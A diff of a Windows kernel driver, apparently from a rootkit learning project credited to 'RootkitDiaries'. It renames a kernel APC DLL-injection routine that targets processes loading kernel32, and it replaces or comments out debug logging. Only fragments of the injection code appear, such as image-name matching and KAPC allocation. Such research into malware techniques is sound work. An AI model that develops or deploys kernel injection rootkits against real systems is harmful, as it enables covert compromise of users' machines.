@@ -1,6 +1,5 @@
 
 #include <ntifs.h>
-
 // from https://github.com/0xOvid/RootkitDiaries/
 
 
@@ -290,7 +289,8 @@ PVOID CustomGetProcAddress(PVOID pModuleBase, UNICODE_STRING functionName) {
 	return NULL;
 }
 
-int kapc_inject(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo) {
+
+int KapcInjectDll(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo) {
 	UNREFERENCED_PARAMETER(ImageName);
 	UNREFERENCED_PARAMETER(ProcessId);
 	UNREFERENCED_PARAMETER(pImageInfo);
@@ -308,7 +308,7 @@ int kapc_inject(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INF
 	if (!(FsRtlIsNameInExpression(&kernel32unicodeString, ImageName, TRUE, NULL))) {
 		return 0;
 	}
-	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] INJECT into pid %d\n", ProcessId);
+	//log_message("[+] INJECT into pid %d\n", ProcessId);
 	/*
 	* How it was done in the original:
 	3) Hash variable its actually a global variable(in real production malware this would be change) defined like this GET_ADDRESS Hash.
@@ -337,7 +337,7 @@ int kapc_inject(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INF
 	Apc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), 'Tag1');
 	if (!Apc)
 	{
-		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[ ] apc error\n");
+		log_message("[ ] apc error\n");
 		return 0;
 	}
 	//KdPrint(("[+] APC allocated\n"));
